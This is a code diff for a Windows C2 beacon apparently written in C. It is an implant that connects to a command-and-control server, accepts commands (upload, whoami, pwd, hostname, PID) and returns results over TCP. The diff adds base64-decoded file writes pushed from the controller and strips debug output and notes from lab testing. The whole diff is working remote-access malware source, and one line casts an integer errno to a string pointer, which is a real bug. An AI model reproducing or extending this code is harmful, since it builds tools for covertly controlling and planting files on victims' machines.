@@ -185,21 +185,16 @@ DWORD getpid(){
 	return pid;
 }
 
-#define B64_FILE_ERROR          2
 
 int upload(char * filename, char * content){
-	printf("[upload] [DBG] Filename as from within upload function: %s", filename);
 	// Upload contents to a file
-	int retcode = B64_FILE_ERROR;
 	errno = 0;
 	FILE *outfile;
 	outfile = fopen(filename, "wb");
 	if (!outfile) {
-		printf("[upload] [DBG] Error opening file... Errno %d\n", errno);
-		return retcode;
+		return errno;
 	}
 	else {
-		printf("[upload] [DBG] File handle got. Uploading...\n");
 		fwrite(content,strlen(content),1,outfile);
 		fclose(outfile);
 		return 0;
@@ -323,7 +318,7 @@ void StartBeacon(char* C2Server, int C2Port)
 	else {
 		while (true) {
 			
-			// Connection verification block START
+			/* #region Connection verification */
 			char RecvData[1024] = "";
 			memset(RecvData, 0, sizeof(RecvData));
 			// here waits for any data input from Server
@@ -334,89 +329,63 @@ void StartBeacon(char* C2Server, int C2Port)
 				WSACleanup();
 				return;
 			}
-			// Connection verification block END
-			// ------------------
+			/* #endregion */
 			
 			char * command;
 			char delim[] = " ";
 			command = strtok(RecvData, delim);
-			printf("[beacon] [DBG] Command is: %s", command);
-
-
-			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
-			if (strcmp(command, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
+			
+			if (strcmp(command, "\n") == 0) {
+				memset(RecvData, 0, sizeof(RecvData));
+				}
 			else if (strcmp(command, "upload") == 0) {
-				// Getting argument after upload into 'file' pointer
-				char * file = strtok(NULL, delim);
-				//char * file = "C:\\Users\\IEUser\\Desktop\\test";
-
-				/* All of scenarios failes....
-				WHY???
-
-				192.168.56.114 $ upload test
-				Failed to write file test
-
-				192.168.56.114 $ upload "C:\\Users\\IEUser\\Desktop\\testing"
-				Failed to write file "C:\\Users\\IEUser\\Desktop\\testing"
-
-				192.168.56.114 $ upload C:\\Users\\IEUser\\Desktop\\testing
-				Failed to write file C:\\Users\\IEUser\\Desktop\\testing
-
-				192.168.56.114 $ upload C:\Users\IEUser\Desktop\testing
-				Failed to write file C:\Users\IEUser\Desktop\testing
-
-				FILENAME IS PARSED CORRECTLY:
-
-				[beacon] [DBG] Command is: upload 
-				[beacon] [DBG] Uploading t3st1ng into test
-				[upload] [DBG] Filename as from within upload function: test
-				[upload] [DBG] Error opening file...
 				
-				[beacon] [DBG] Command is: upload 
-				[beacon] [DBG] Uploading t3st1ng into "C:\\Users\\IEUser\\Desktop\\testing"
-				[upload] [DBG] Filename as from within upload function: "C:\\Users\\IEUser\\Desktop\\testing"
-				[upload] [DBG] Error opening file...
-				
-				[beacon] [DBG] Command is: upload 
-				[beacon] [DBG] Uploading t3st1ng into C:\\Users\\IEUser\\Desktop\\testing
-				[upload] [DBG] Filename as from within upload function: C:\\Users\\IEUser\\Desktop\\testing
-				[upload] [DBG] Error opening file...
+				// Parse filename and contents
+				char * filename = strtok(NULL, delim);
+				char * b64_contents = strtok(NULL, delim);
+				// this needed to trim new line from the end, so base64 can be parsed correctly further
+				b64_contents = strtok(b64_contents,"\n");
+				size_t filesize = b64_decoded_size(b64_contents);
+				char contents[filesize];
+				char * cntptr = contents;
+				cntptr  = b64_decode(b64_contents);
 
-				[beacon] [DBG] Command is: upload 
-				[beacon] [DBG] Uploading t3st1ng into C:\Users\IEUser\Desktop\testing
-				[upload] [DBG] Filename as from within upload function: C:\Users\IEUser\Desktop\testing
-				[upload] [DBG] Error opening file...
-				 */
-				
-				char * contents = "t3st1ng";
-				printf(" [beacon] [DBG] Uploading %s into %s",contents,file);
+				printf("[beacon] decoded data: %s\n", cntptr);
+
+				// uploading
 				int result;
-				result = upload(file,contents);
+				result = upload(filename,cntptr);
 				
 				/* #region Parse result AND send reponse */
 				if (result == 0) {
 					// C&C part
-					char buffer[20];
+					char buffer[255];
 					memset(buffer, 0, sizeof(buffer));
-					strcat(buffer,"Uploaded ");
-					strcat(buffer,file);
-
+					strcat(buffer,"\nUploaded ");
+					strcat(buffer,filename);
+					strcat(buffer,"\n");
+					
 					send(tcpsock,buffer,strlen(buffer)+1,0);
 					// clear buffers
+					memset(contents, 0, sizeof(contents));
 					memset(buffer, 0, sizeof(buffer));
 					memset(RecvData, 0, sizeof(RecvData)); 
 				}
-				else if (result == 2) {
+				else {
 					// C&C part
-					char buffer[20];
+					char buffer[255];
 					memset(buffer, 0, sizeof(buffer));
-					strcat(buffer,"Failed to write file ");
-					strcat(buffer,file);
+					strcat(buffer,"Failed to write file. Errno from fopen: %d");
+					strcat(buffer, (char*)result);
+					strcat(buffer, " Filename: ");
+					strcat(buffer,filename);
+					strcat(buffer, "\n");
 
 					send(tcpsock,buffer,strlen(buffer)+1,0);
 					// clear buffers
+					memset(contents, 0, sizeof(contents));
 					memset(buffer, 0, sizeof(buffer));
-					memset(RecvData, 0, sizeof(RecvData)); 	
+					memset(RecvData, 0, sizeof(RecvData));
 				}
 				/* #endregion */
 			}
@@ -432,6 +401,7 @@ void StartBeacon(char* C2Server, int C2Port)
 				memset(buffer, 0, sizeof(buffer));
 				strcat(buffer,"Current PID: ");
 				strcat(buffer,cpid);
+				strcat(buffer, "\n");
 
 				send(tcpsock,buffer,strlen(buffer)+1,0);
 				// clear buffers
@@ -442,6 +412,7 @@ void StartBeacon(char* C2Server, int C2Port)
 				char buffer[257] = ""; // reserve buffer with length of 257 bytes
 				whoami(buffer); // call whoami function
 				strcat(buffer, "\n"); 
+
 				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
 				// clear buffers
 				memset(buffer, 0, sizeof(buffer));
@@ -451,7 +422,8 @@ void StartBeacon(char* C2Server, int C2Port)
 			else if (strcmp(command, "pwd\n") == 0) {
 				char buffer[257] = "";
 				pwd(buffer);
-				strcat(buffer, "\n"); 
+				strcat(buffer, "\n");
+
 				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
 				// clear buffers
 				memset(buffer, 0, sizeof(buffer));
@@ -461,6 +433,7 @@ void StartBeacon(char* C2Server, int C2Port)
 				char buffer[257] = "";
 				hostname(buffer);
 				strcat(buffer, "\n"); 
+				
 				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
 				// clear buffers
 				memset(buffer, 0, sizeof(buffer));
